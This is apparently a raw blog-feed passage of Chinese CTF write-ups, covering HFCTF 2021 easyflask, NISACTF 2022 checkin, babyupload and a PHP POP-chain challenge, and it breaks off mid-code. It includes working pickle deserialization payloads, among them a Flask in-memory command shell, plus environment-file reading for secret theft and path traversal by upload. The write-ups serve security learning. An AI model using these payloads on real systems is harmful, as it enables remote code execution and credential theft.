class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">paylaod = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(paylaod)</span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line"><span class="comment"># V 指令可以将unicode编码转换为字符串</span></span><br></pre></td></tr></table></figure><p>进行session伪造：</p><img src="/pickle/pickle/image-20250704112158856.png" class="" title="image-20250704112158856"><p>发包：</p><img src="/pickle/pickle/image-20250704112228473.png" class="" title="image-20250704112228473"><p>读取数据：</p><img src="/pickle/pickle/image-20250704112249719.png" class="" title="image-20250704112249719"><h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><img src="/pickle/pickle/image-20250714123612568.png" class="" title="image-20250714123612568"><p>一个路由，直接访问：</p><img src="/pickle/pickle/image-20250714123638934.png" class="" title="image-20250714123638934"><p>告诉我们源码在&#x2F;app&#x2F;source</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_handler</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>) <span class="comment"># 从session中获得</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>): <span class="comment"># 判断u是不是字典</span></span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>)) </span><br><span class="line">        u = pickle.loads(u) <span class="comment"># 重点在这里，pickle反序列化，但是没有回显。</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>有任意文件读，secret在环境中；&#x2F;proc&#x2F;self&#x2F;environ读取环境变量。</p><img src="/pickle/pickle/image-20250714124109151.png" class="" title="image-20250714124109151"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">exec</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).popen(&quot;sleep 5&quot;).read()&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><img src="/pickle/pickle/image-20250714124550472.png" class="" title="image-20250714124550472"><p>确实响应了5秒钟</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">exec</span></span><br><span class="line"><span class="string">(S&#x27;app.before_request_funcs.setdefault(None, []).append(lambda: __import__(&quot;os&quot;).popen(__import__(&#x27;flask&#x27;,fromlist=[&#x27;request&#x27;]).request.args.get(&#x27;x&#x27;,&#x27;ls&#x27;)).read())&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>直接打内存马。</p><img src="/pickle/pickle/image-20250714124940647.png" class="" title="image-20250714124940647"><img src="/pickle/pickle/image-20250714124954413.png" class="" title="image-20250714124954413"><p>拿flag</p><img src="/pickle/pickle/image-20250714125022696.png" class="" title="image-20250714125022696">]]></content>
      
      
      <categories>
          
          <category> pickle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF 2022</title>
      <link href="/CTFwp/NISACTF-2022/"/>
      <url>/CTFwp/NISACTF-2022/</url>
      
        <content type="html"><![CDATA[<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><img src="/CTFwp/NISACTF-2022/image-20250622171959520.png" class="" title="image-20250622171959520"><img src="/CTFwp/NISACTF-2022/image-20250622185658.png" class="" title="屏幕截图 2025-06-22 185658"><p><strong>如何在010editor复制16进制，Ctrl+Shift+c就可以复制16进制。</strong></p><p>通过赛博厨子将16进制解码，再进行url编码就可以。</p><img src="/CTFwp/NISACTF-2022/image-20250622191440121.png" class="" title="image-20250622191440121"><img src="/CTFwp/NISACTF-2022/image-20250622191508988.png" class="" title="image-20250622191508988"><img src="/CTFwp/NISACTF-2022/image-20250622191523157.png" class="" title="image-20250622191523157"><p>也可以写到文件里面通过脚本进行url编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_read</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data1</span> = <span class="title function_ invoke__">file_read</span>(<span class="string">&quot;./1.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$data1</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$data2</span> = <span class="title function_ invoke__">file_read</span>(<span class="string">&quot;./2.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$data2</span>);</span><br><span class="line"><span class="comment"># %E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF</span></span><br><span class="line"><span class="comment"># %E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan</span></span><br></pre></td></tr></table></figure><h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><img src="/CTFwp/NISACTF-2022/image-20250622155012937.png" class="" title="image-20250622155012937"><p>泄露了源码</p><p>先分析&#x2F;路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 文件上传到/upload目录。</span></span><br></pre></td></tr></table></figure><p>接着分析&#x2F;upload路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename: <span class="comment"># 文件中不能包含.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db() <span class="comment"># 跟进db()方法</span></span><br><span class="line">    cur = conn.cursor() <span class="comment"># 创建游标(用于执行SQL语句)</span></span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,)) <span class="comment">#execute执行sql语句</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit() <span class="comment">#提交当前改动结果(如果向表格插入语句，必须执行conn.commit语句)</span></span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid) <span class="comment">#重定向到/file/uid路由</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>) <span class="comment"># 查看是否存在数据库</span></span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>) <span class="comment">#建立与 SQLite 数据库文件的连接。</span></span><br><span class="line">    <span class="keyword">return</span> g_db <span class="comment"># 返回connection对象，进行后续操作；返回/upload路由。</span></span><br></pre></td></tr></table></figure><p>分析&#x2F;file路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone() <span class="comment">#获取单行数据</span></span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="comment"># res[0] 以/开头，uploads/会被省略</span></span><br><span class="line"><span class="comment"># 此题主要考察的是就是上面这个。</span></span><br></pre></td></tr></table></figure><p>如果我们上传了一个文件名为&#x2F;flag，那么打开的时候，是打开的&#x2F;flag，而不是我们上传的&#x2F;uploads&#x2F;flag。</p><img src="/CTFwp/NISACTF-2022/image-20250622162942933.png" class="" title="image-20250622162942933"><p>题目做完了，我们看看其他知识点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_first_request </span><span class="comment"># 第一次请求前执行一次，flask2.3被删除，flask2.2弃用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>) <span class="comment"># 删除database.db</span></span><br><span class="line">    cur = db().cursor() <span class="comment"># 创建游标(用于执行sql语句)</span></span><br><span class="line">    cur.executescript(SCHEMA) <span class="comment"># 创建表格</span></span><br></pre></td></tr></table></figure><p>做python这种题，就要一步一步审计代码，找漏洞。</p><h2 id="babyserialize"><a href="#babyserialize" class="headerlink" title="babyserialize"></a>babyserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>pop链如何找了，一般我们都先找能利用的漏洞，一般能利用的漏洞就是pop链的尾端，我们是从尾端一步一步给首推了。</p><p>__invoke()方法里面有：eval()方法，我们将__invoke()作为末尾，如何触发__invoke()方法了，<strong>当尝试把对象当做函数调用时，就会触发__invoke()方法。</strong></p><p>在Ilovetxw类的__toString()方法中，调用了$bb()方法，如果$bb被我们赋值为NISA实例化后的对象就会触发NISA类里面的__invoke方法。如何触发__toString()方法了，<strong>当把对象当做字符串使用时就会触发。</strong></p><p>1.在NISA类的__wakeup()方法中，如果我们将fun赋值为Ilovetxw类的实例化对象时，对象和字符串进行弱比较，会进行类型的转换，这个时候将对象转换为字符串，就会触发Ilovetxw类的__toString()方法。</p><p>2.在four类的__set()方法中，将a属性赋值为对象，strtolower只接受string类型，而这里接受了一个object类型的，就会触发Ilovetxw类的__toString()方法。如何触发__set()方法了，<strong>对不存在或者不可访问的变量进行赋值的话，就会自动调用。</strong> </p><p>在NISA类的__call()方法中，对不可访问的fun进行赋值，触发__set方法。如何触发__call()方法了，<strong>对不存在的方法或者不可访问的方法进行调用时就会自动调用该方法。</strong></p><p>在TianXiWei类的__wakeup()方法中，调用了TianXiWei中不存在的方法nisa，触发__call()方法。当调用unserialize方法时，会触发__wakeup()方法。到此就结束了。</p><p>现在有两个pop链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 